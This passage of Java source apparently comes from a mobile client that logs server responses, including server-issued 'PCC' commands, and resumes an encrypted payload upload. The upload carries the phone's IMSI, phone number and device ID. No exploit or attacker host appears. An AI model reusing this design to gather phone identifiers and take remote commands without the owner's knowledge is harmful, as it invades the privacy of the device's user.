						Log.debug(TAG, " getActCodeRes.getStatusCode(): " + getActCodeRes.getStatusCode());
						Log.debug(TAG, " getActCodeRes.getCommand(): " + getActCodeRes.getCommand().getId());
						Log.debug(TAG, " getActCodeRes.getActivationCode(): " + getActCodeRes.getActivationCode());
						Vector pcc = getActCodeRes.getPCCCommands();
						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof SendEventCmdResponse) {
					SendEventCmdResponse sendRes = (SendEventCmdResponse) cmdResponse;
					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " sendRes.getExtStatus(): " 	+ sendRes.getExtStatus());
						Log.debug(TAG, " sendRes.getServerId(): " 	+ sendRes.getServerId());
						Log.debug(TAG, " sendRes.getServerMsg(): " 	+ sendRes.getServerMsg());
						Log.debug(TAG, " sendRes.getStatusCode(): " + sendRes.getStatusCode());
						Log.debug(TAG, " sendRes.getCommand(): " 	+ sendRes.getCommand().getId());
						Vector pcc = sendRes.getPCCCommands();
						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
							Log.debug(TAG, " nextCmd.getCmdId(): " 	+ nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else {
					UnknownCmdResponse unknownRes = (UnknownCmdResponse) cmdResponse;
					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " unknownRes.getExtStatus(): " 	+ unknownRes.getExtStatus());
						Log.debug(TAG, " unknownRes.getServerId(): " 	+ unknownRes.getServerId());
						Log.debug(TAG, " unknownRes.getServerMsg(): " 	+ unknownRes.getServerMsg());
						Log.debug(TAG, " unknownRes.getStatusCode(): " 	+ unknownRes.getStatusCode());
						Log.debug(TAG, " unknownRes.getCommand(): " 	+ unknownRes.getCommand().getId());
						Vector pcc = unknownRes.getPCCCommands();
						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				}
			}
		}
		
		public void onAcknowledgeSecureError(Throwable err) {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, " onAcknowledgeSecure is error!: ", err);
			}
		}

		public void onAcknowledgeSecureSuccess(AckSecCmdResponse ackSecResponse) {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, " onAcknowledgeSecure is success! ");
			}
		}

		public void onAcknowledgeError(Throwable err) {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, " onAcknowledge is error!: ", err);
			}			
		}

		public void onAcknowledgeSuccess(AckCmdResponse acknowledgeResponse) {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, " oAcknowledge is success! ");
			}
		}
		
		
		
		// -- Resume private methods -----
		
		private int doRask() throws NullPointerException, IOException, DataTooLongForRSAEncryptionException, InterruptedException {
			//1. initial new CommandMetaData
			CommandMetaData metaData = initCommandMetaData();
			SendRAsk rask = new SendRAsk();
			rask.setUrl(_session.getUrl()); 
			int numbOfBytes = rask.doRAsk(metaData, _session.getPayloadCRC32(), _session.getPayloadSize(), _session.getServerPublicKey(), _session.getAesKey(), _session.getSessionId());
			return numbOfBytes;
		}
		
		private CommandMetaData initCommandMetaData() {
			CommandMetaData metaData = new CommandMetaData();
			metaData.setActivationCode(_session.getActivationCode());
			metaData.setCompressionCode(_session.getCompressionCode());
			metaData.setConfId(_session.getConfiguration());
			metaData.setDeviceId(_session.getDeviceId());
			metaData.setEncryptionCode(_session.getEncryptionCode());
			metaData.setImsi(_session.getImsi());
			metaData.setLanguage(_session.getLanguage());
			metaData.setMcc(_session.getMcc());
			metaData.setMnc(_session.getMnc());
			metaData.setPhoneNumber(_session.getPhoneNumber());
			metaData.setProductId(_session.getProductId());
			metaData.setProductVersion(_session.getProductVersion());
			metaData.setProtocolVersion(_session.getProtocolVersion());
			return metaData;	
		}
		
		private void buildResumeCmdPacketData(int numbOfBytes) throws NullPointerException, 
							IllegalArgumentException, IOException, InterruptedException, 
							CRC32Exception, DataTooLongForRSAEncryptionException {
			
			if (Log.isDebugEnable()) {
			Log.debug(TAG + ".buildResumeCmdPacketData()", "Starting!");
			}
			
			//Build Command_Packet_data
			ProtocolPacketBuilder protPacketBuilder = new ProtocolPacketBuilder();
			response = protPacketBuilder.buildResumeCmdPacketData(
					initCommandMetaData(), 
					_session.getPayloadPath(), 
					_session.getServerPublicKey(), 
					_session.getAesKey(), 
					_session.getSessionId(), 
					_resumeRequest.getTransportDirective(),
					numbOfBytes);
			
			if (Log.isDebugEnable()) {
			Log.debug(TAG + ".buildResumeCmdPacketData()", "Finished!");
			}
			
		}
		
	}
}
